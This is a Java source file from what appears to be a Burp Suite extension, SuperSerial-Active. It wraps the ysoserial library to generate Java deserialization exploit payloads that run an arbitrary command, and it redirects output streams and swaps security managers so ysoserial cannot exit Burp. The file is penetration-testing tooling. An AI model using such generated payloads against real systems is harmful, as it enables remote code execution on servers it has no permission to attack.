/*
	SuperSerialPayloadGenerator.java
	
	v0.5 (11/22/2016)
	
	Class created for the specific purpose of generating ysoserial payloads. Intended to be used by all Burp tools.
*/

package superserial.payload;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;

import ysoserial.GeneratePayload;

import burp.IBurpExtenderCallbacks;

import superserial.security.PreventExitSecurityManager;
import superserial.security.ExitException;

public class SuperSerialPayloadGenerator {
	//fields
	private static SuperSerialPayloadGenerator instance;
	private IBurpExtenderCallbacks callbacks;
	private PreventExitSecurityManager peSecurityManager;
	
	//constants
	public static final int SUPERSERIAL_INTERNAL_ERROR_CODE = 76; //superserial-active internal error code
	public static final int YSOSERIAL_INTERNAL_ERROR_CODE = 70; //ysoserial internal error exit code
	public static final int YSOSERIAL_USAGE_CODE = 64; //ysoserial "printUsage()" exit code
	
	private SuperSerialPayloadGenerator(IBurpExtenderCallbacks cb) {
		callbacks = cb;
		peSecurityManager = new PreventExitSecurityManager();
	}
	
	public static SuperSerialPayloadGenerator getInstance() {
		if(instance == null) {
			instance = new SuperSerialPayloadGenerator(null);
		}
		return instance;
	}
	
	public static SuperSerialPayloadGenerator getInstance(IBurpExtenderCallbacks cb) {
		if(instance == null) {
			instance = new SuperSerialPayloadGenerator(cb);
		}
		return instance;
	}
	
	//generate ysoserial payload as byte array. If error is encountered, return the error code in a size 1 byte array.
	public synchronized byte[] generatePayload(String technique,String cmd) {
		//change stderr from System.err to Burp stderr OutputStream (to allow printing of any errors into the Extender->Errors tab)
		System.err.flush();
		PrintStream origStderr = System.err;
		PrintStream psErr = new PrintStream(callbacks.getStderr());
		try {
			System.setErr(psErr);
		} catch(SecurityException se) { //error changing stderr OutputStream: print stack trace and continue (errors will only be printed to console)
			se.printStackTrace();
		}
		
		//change stdout from System.out to ByteArrayOutputStream
		System.out.flush();
		PrintStream origStdout = System.out;
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		PrintStream ps = new PrintStream(baos);
		try {
			System.setOut(ps);
		} catch(Exception e) { //error changing stdout OutputStream: print exception to errors tab, reset System.err and return error code in byte array
			callbacks.printError("Error occurred generating "+technique+" payload (SuperSerial-Active internal error) with command: "+cmd);
			callbacks.issueAlert("Error occurred generating "+technique+" payload (SuperSerial-Active internal error) with command: "+cmd);
			e.printStackTrace();
			System.setErr(origStderr); //hope for no Exception here
			try {
				baos.close();
				ps.close();	
			} catch(Exception e2) {
				e2.printStackTrace();
			}
			return new byte[] {(byte) SUPERSERIAL_INTERNAL_ERROR_CODE};
		}
	
		//Remove current SecurityManager and temporarily set to custom SecurityManager that prevents System.exit() within ysoserial from killing Burp
		SecurityManager origSM = System.getSecurityManager();
		System.setSecurityManager(null); //hope for no Exception here
		System.setSecurityManager(peSecurityManager); //hope for no Exception here
		
		//generate payload
		try {
			GeneratePayload.main(new String[] {technique,cmd});
		} catch(ExitException ee) {
			switch(ee.getStatus()) { 
				case 0: //normal ysoserial execution, continue
					break;
				default: //error in ysoserial execution (internal error or usage error): reset SecurityManager and OutputStream objects and return error code in byte array
					callbacks.printError("Error occurred generating "+technique+" payload (ysoserial "+(ee.getStatus()==YSOSERIAL_INTERNAL_ERROR_CODE ? "internal" : "usage")+" error) with command: "+cmd);
					callbacks.issueAlert("Error occurred generating "+technique+" payload (ysoserial "+(ee.getStatus()==YSOSERIAL_INTERNAL_ERROR_CODE ? "internal" : "usage")+" error) with command: "+cmd);
					System.setSecurityManager(null); //hope for no Exception here
					System.setSecurityManager(origSM); //hope for no Exception here
					try {
						baos.close();
						ps.close();	
					} catch(Exception e2) { //print stack trace and continue
						e2.printStackTrace();
					}
					System.setOut(origStdout); //hope for no Exception here
					System.setErr(origStderr); //hope for no Exception here
					return new byte[] {(byte) ee.getStatus()};
			}
		}
		
		//Remove custom SecurityManager and set back to original
		System.setSecurityManager(null); //hope for no Exception here
		System.setSecurityManager(origSM); //hope for no Exception here
		
		//get payload byte array
		System.out.flush();
		try {
			baos.close();
			ps.close();
		} catch(Exception e) { //print stack trace and continue
			e.printStackTrace();
		}
		byte[] payload = baos.toByteArray();
		
		//Set stdout back to System.out and stderr back to System.err, hope for no Exceptions
		System.err.flush();
		System.setOut(origStdout); //hope for no Exception here
		System.setErr(origStderr); //hope for no Exception here
		
		return payload;
	}
}
